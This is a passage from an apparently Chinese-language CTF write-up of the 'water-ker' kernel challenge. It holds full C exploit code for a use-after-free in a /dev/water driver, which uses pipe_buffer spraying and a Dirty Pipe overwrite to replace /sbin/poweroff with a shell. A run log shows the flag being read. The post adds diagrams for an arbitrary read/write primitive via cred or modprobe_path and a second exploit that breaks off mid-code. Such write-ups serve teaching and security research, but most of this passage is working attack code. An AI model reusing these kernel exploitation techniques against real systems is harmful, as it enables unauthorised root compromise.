i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_primitive</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">int</span> snd_pipe_fd[SND_PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz;</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write pipe then we can read&quot;</span>);</span><br><span class="line">  <span class="comment">// ? 因为我们在find victim 写了 3 个 字符串 和 3个 sizeof(int) 导致</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer, SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;free origin pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fcntl to set the pipe in victim page&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;failed to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = <span class="built_in">splice</span>(target_fd, &amp;offset, snd_pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) <span class="built_in">err_exit</span>(<span class="string">&quot;splice() error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ? 还是find victim_idx 读取了 tag 和 idx 导致的指针偏移</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer, SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;ops: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.ops);</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;debug&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info_pipe_buf.flags |= PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">  info_pipe_buf.offset = <span class="number">0</span>;</span><br><span class="line">  info_pipe_buf.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 泄露信息的下一个pipe_buf</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;dirty pipe write target file&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(snd_pipe_fd[i][<span class="number">1</span>], payload, <span class="built_in">sizeof</span>(payload));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write ook&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(target_fd, buffer, <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buffer, <span class="string">&quot;/bin/sh&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;do not write&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;/sbin/poweroff: %s&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/sh /tmp/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/cat /tmp/cat&quot;</span>);</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">pipe_primitive</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after dirty pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">check</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;if see this, write ok&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 结果如下，成功率蛮高的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Boot took 2.16 seconds</span><br><span class="line">/ $ ./exp</span><br><span class="line">[+] spray pipe</span><br><span class="line">[+] change ring_size make pipe-&gt;bufs kmalloc-512</span><br><span class="line">[+] kmalloc-512 hole</span><br><span class="line">[+] new chunk <span class="keyword">then</span> free</span><br><span class="line">write chunk data D</span><br><span class="line"></span><br><span class="line">[+] fill the hole</span><br><span class="line">[+] alloc pipe_buffer pages</span><br><span class="line">[+] uaf change pipe-&gt;bufs-&gt;page</span><br><span class="line">[+] find victim pipe</span><br><span class="line">[+] succeed find victim: 0, origin: 1</span><br><span class="line">pause after uaf</span><br><span class="line"></span><br><span class="line">[+] write pipe <span class="keyword">then</span> we can <span class="built_in">read</span></span><br><span class="line">[+] free origin pipe</span><br><span class="line">[+] fcntl to <span class="built_in">set</span> the pipe <span class="keyword">in</span> victim page</span><br><span class="line">[+] page: 0xffffea0000193140</span><br><span class="line">[+] ops: 0xffffffff82248500</span><br><span class="line">debug</span><br><span class="line"></span><br><span class="line">[+] dirty pipe write target file</span><br><span class="line">[+] write ook</span><br><span class="line">pause after dirty pipe</span><br><span class="line"></span><br><span class="line">/sbin/poweroff: <span class="comment">#!/tmp/sh</span></span><br><span class="line"> /tmp/ڀ@<span class="keyword">if</span> see this, write ok</span><br><span class="line"></span><br><span class="line">[   14.466663] BUG: Bad page state <span class="keyword">in</span> process exp  pfn:07714</span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">flag&#123;test_flag&#125;</span><br><span class="line">/bin/ls: line 3: syntax error: unexpected <span class="string">&quot;)&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="task-struct-cred"><a href="#task-struct-cred" class="headerlink" title="task struct cred"></a>task struct cred</h4><p>二级管道，任意地址读写，也可以写 <code>modprobe_path</code>。</p>
<p>为什么刚开始写pipe要写三个数字：因为我们要至少三次读取获得idx。</p>
<p>我们需要使用第二次page-level-uaf，借助另外三个管道：</p>
<ul>
<li>位置在第二个 uaf page ： pipe1 &amp; pipe2 &amp; pipe3，其page指针全都指向第二个 uaf page 对应的 struct page 结构体。</li>
<li>pipe1，实现任意地址读，只需要修改page指针和 offset + len 变量</li>
<li>pipe2，修改pipe3 </li>
<li>pipe3，可以修改pipe1 &amp; pipe 2 内容</li>
<li>只需要控制 pipe_buffer 的 page 指针、offset 和 len 就可以实现任意地址读写</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">origin ‾‾|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz +</span><br><span class="line">		  +------------+</span><br><span class="line"></span><br><span class="line">读取pipe_bufs2 获得 info_pipe_buf,然后通过 victim 写 pipe_bufs3，这里这个page</span><br><span class="line">origin ￣|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz + ‾‾‾‾‾‾‾‾‾‾|</span><br><span class="line">		  +------------+           |</span><br><span class="line">		  +   ...      +           |</span><br><span class="line">		  +------------+           |</span><br><span class="line">		  + pipe_bufsn + --------------&gt; page</span><br><span class="line">		  +------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">找到这两个idx, 然后构造二级page-level-uaf，使用 pipe_bufs 使用这个 page</span><br><span class="line">origin ￣|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz + snd_victim‾‾‾‾‾‾‾‾‾‾|</span><br><span class="line">		  +------------+                     |</span><br><span class="line">		  +   ...      +                     |</span><br><span class="line">		  +------------+                     |</span><br><span class="line">		  + pipe_bufsn + snd_origin--------------&gt; uaf  page</span><br><span class="line">		  +------------+                          +------------+</span><br><span class="line">									              + pipe_bufs1 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs2 + </span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs3 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs4 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          +     ...    +</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">snd_victim_idx 写 0, 1, 2, 3 伪造对应的 pipe_buffer page len offset，都可以读写pipe_bufs2</span><br><span class="line"></span><br><span class="line">最终情形</span><br><span class="line">4 向 2 里面写内容，改变 page 和 offset 和 len，就能任意地址读。</span><br><span class="line">4 向 3 里写内容，使 Y write 开始地址为 Z</span><br><span class="line">3 改 4，可以一直写 X</span><br></pre></td></tr></table></figure>


<p>在构造第一个 page-level-uaf 中，读取内容即使找到也不能 break，否则第二次读取出错。</p>
<p>exp 如下</p>
<ul>
<li>在info leak 出错，不知道为什么读取不出来内容，看了几遍也不知道哪里出问题，当局者迷吧🤡。</li>
</ul>
<p>找到一篇文章：<a href="https://blog.csdn.net/qq_61670993/article/details/134359694">强网拟态2023-water-ker</a>，exp可以提权，编译时显示缺少了一个括号，补上就行。</p>
<p>如下为失败的exp。<del>没成功为什么要放上来，不能让我白写吧</del></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 200</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="comment">// kmalloc-cg-192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUFS_SIZE 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> snd_victim_idx = <span class="number">-1</span>, snd_origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_2 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_3 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_4 = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf_2, evil_pipe_buf_3, evil_pipe_buf_4;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="comment">// debug(&quot;write chunk data D&quot;);</span></span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;get victim chunk&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">second_page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write something to no.1 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.1 origin idx pipe to page-level-uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer,</span><br><span class="line">       SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page pointer: %p\n\t\tops: %p&quot;</span>, info_pipe_buf.page,</span><br><span class="line">           info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span 